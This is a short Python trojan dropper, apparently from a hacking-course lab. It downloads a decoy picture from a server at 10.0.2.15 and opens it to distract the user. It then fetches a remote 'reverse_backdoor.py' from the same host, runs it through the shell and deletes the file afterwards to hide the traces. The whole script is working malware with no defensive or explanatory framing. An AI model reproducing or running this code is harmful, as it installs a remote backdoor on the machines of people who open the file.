#!/usr/bin/env python
import requests, subprocess, os, tempfile

def download (url):
    """This program requires INTERNET connection and an accessible
    server to get files via URL."""
    get_url = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as file:
        file.write(get_url.content)

temp_dir = tempfile.gettempdir()
os.chdir(temp_dir)
#Download good files
download('http://10.0.2.15/Evil%20Files/Trojan/pic.jpg')
subprocess.Popen("pic.jpg", shell=True)
#Download evil files
download("http://10.0.2.15/Evil%20Files/Backdoor/reverse_backdoor.py")
subprocess.call("reverse_backdoor.py", shell=True)

#os.remove("pic.jpg")
os.remove("reverse_backdoor.py")

